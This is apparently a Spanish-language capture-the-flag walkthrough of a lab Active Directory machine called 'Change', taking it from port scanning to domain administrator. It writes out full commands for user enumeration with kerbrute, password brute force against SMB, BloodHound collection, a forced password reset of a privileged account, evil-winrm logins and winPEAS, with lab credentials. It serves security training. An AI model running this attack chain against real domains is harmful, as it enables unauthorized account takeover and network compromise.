---
description: '🔍 Dificultad: Media'
---

# Change

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.54
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-20 173556.png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.54
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-20 173942.png" alt=""><figcaption></figcaption></figure>

Durante el escaneo, se identificaron múltiples puertos abiertos relacionados con **servicios típicos de Active Directory en un entorno Windows Server**. A continuación, se detalla cada uno:

| Puerto          | Servicio                 | Descripción                                                                   | Relevancia en Pentesting                                                        |
| --------------- | ------------------------ | ----------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **53**          | DNS (Simple DNS Plus)    | Servicio de resolución de nombres. Fundamental para la operación del dominio. | Enumeración de zonas, DNS spoofing, análisis de transferencias (`dig axfr`).    |
| **88**          | Kerberos                 | Protocolo de autenticación utilizado por AD.                                  | Objetivo de ataques como Kerberoasting, Pass-the-Ticket, Golden Ticket.         |
| **135**         | MS RPC                   | Microsoft RPC endpoint mapper.                                                | Comunicación entre servicios. Puede facilitar enumeración vía `rpcclient`.      |
| **139**         | NetBIOS-SSN              | Servicio para compartir archivos e impresoras (NetBIOS).                      | Usado con `smbclient`, `enum4linux-ng`, `smbmap`.                               |
| **389**         | LDAP                     | Protocolo para acceder al directorio (modo sin cifrar).                       | Enumeración de usuarios, grupos, SPNs, flags UAC. Clave en enumeración AD.      |
| **445**         | SMB (Microsoft-DS)       | Compartición de archivos en Windows.                                          | Dump de hashes, movimiento lateral (SMBexec, Psexec), enumeración sin creds.    |
| **464**         | kpasswd5                 | Servicio para cambio de contraseñas vía Kerberos.                             | Interesante para ataques como _krbrelayx_ o abuso de cuentas.                   |
| **593**         | RPC over HTTP            | Comunicación RPC encapsulada en HTTP.                                         | Utilizado por Exchange, Outlook y otras apps. A veces base de ataques internos. |
| **636**         | LDAPS (tcpwrapped)       | LDAP sobre SSL/TLS.                                                           | Enumeración segura del directorio, aunque a menudo filtrado o cifrado.          |
| **3268**        | Global Catalog (LDAP)    | Puerto usado para consultas a todo el bosque AD.                              | Ideal para enumerar objetos de todo el dominio.                                 |
| **3269**        | GC over SSL (tcpwrapped) | Versión segura del Global Catalog.                                            | Misma funcionalidad que el 3268, pero cifrado.                                  |
| **5985**        | WinRM (HTTP)             | Windows Remote Management.                                                    | Punto de entrada para `evil-winrm`. Fundamental para ejecución remota.          |
| **9389**        | .NET Message Framing     | Servicio para autenticación de AD Web Services (ADWS).                        | Utilizado por PowerShell Remoting, BloodHound, etc.                             |
| **47001**       | HTTPAPI                  | Servicio adicional HTTP, generalmente WinRM.                                  | Usado por PowerShell Remoting.                                                  |
| **49664–49714** | MS RPC dinámicos         | Puertos de comunicación RPC asignados dinámicamente.                          | Relevantes para movimiento lateral, enumeración y abuso de servicios remotos.   |

### 🔎 **EXPLORACIÓN**

Tras el escaneo, hacemos una enumeración **SMB**.

```
nxc smb 192.168.1.54
```

<figure><img src="../../.gitbook/assets/image (1640).png" alt=""><figcaption></figcaption></figure>

Tenemos un dominio que añadimos al fichero `/etc/hosts`. Miramos los recursos compartidos.

```
nxc smb 192.168.1.54 --shares -u '' -p ''
```

<figure><img src="../../.gitbook/assets/image (1641).png" alt=""><figcaption></figcaption></figure>

```
smbmap --no-banner -H 192.168.1.54 -u '' -p ''
```

<figure><img src="../../.gitbook/assets/image (1642).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Tras no encontrar nada, intentamos sacar usuarios a través del dominio.

```
./kerbrute userenum -d megachange.nyx --dc 192.168.1.54 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

<figure><img src="../../.gitbook/assets/image (1643).png" alt=""><figcaption></figcaption></figure>

Realizamos fuerza bruta al usuario **alfredo**.

```
nxc smb 192.168.1.54 -u 'alfredo' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

<figure><img src="../../.gitbook/assets/image (1644).png" alt=""><figcaption></figcaption></figure>

A través de **Bloodhound** investigamos el dominio.

```
bloodhound-python -u 'alfredo' -p 'Password1' -ns 192.168.1.54 -d megachange.nyx -c All --zip
```

Subimos el Zip y analizamos.

<figure><img src="../../.gitbook/assets/image (1645).png" alt=""><figcaption></figcaption></figure>

**Alfredo** tiene capacidad de **ForceChangePassword** sobre **SysAdmin**. Significa que puede usar **net** para cambiar la contraseña del usuario **SysAdmin**.

```
net rpc password sysadmin 'Hola123' -U "megachange.nyx/alfredo%Password1" -S 192.168.1.54
```

Validamos el cambio por **SMB**.

```
netexec smb 192.168.1.54 -u 'sysadmin' -p 'Hola123'
```

<figure><img src="../../.gitbook/assets/image (1646).png" alt=""><figcaption></figcaption></figure>

Validamos el cambio por **WINRM**.

```
netexec winrm 192.168.1.54 -u 'sysadmin' -p 'Hola123'
```

<figure><img src="../../.gitbook/assets/image (1647).png" alt=""><figcaption></figcaption></figure>

Sabiendo eso nos conectamos.

```
evil-winrm -i 192.168.1.54 -u 'sysadmin' -p 'Hola123'
```

<figure><img src="../../.gitbook/assets/image (1648).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

<figure><img src="../../.gitbook/assets/image (1649).png" alt=""><figcaption></figcaption></figure>

Subimos **winPEASx64.exe** y ejecutamo&#x73;**.**

{% @github-files/github-code-block url="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" %}

<figure><img src="../../.gitbook/assets/image (1650).png" alt=""><figcaption></figcaption></figure>

Habiendo obtenido estas credenciales las validamos como anteriormente.

```
netexec smb 192.168.1.54 -u 'administrator' -p 'd0m@in_c0ntr0ll3r'
netexec winrm 192.168.1.54 -u 'administrator' -p 'd0m@in_c0ntr0ll3r'
```

<figure><img src="../../.gitbook/assets/image (1651).png" alt=""><figcaption></figcaption></figure>

Esto significa que nos podemos conectar como **Administrator**.

```
evil-winrm -i 192.168.1.54 -u 'administrator' -p 'd0m@in_c0ntr0ll3r'
```

<figure><img src="../../.gitbook/assets/image (1652).png" alt=""><figcaption></figcaption></figure>

Ya podemos obtener las **flags**.

<figure><img src="../../.gitbook/assets/image (1653).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1654).png" alt=""><figcaption></figcaption></figure>
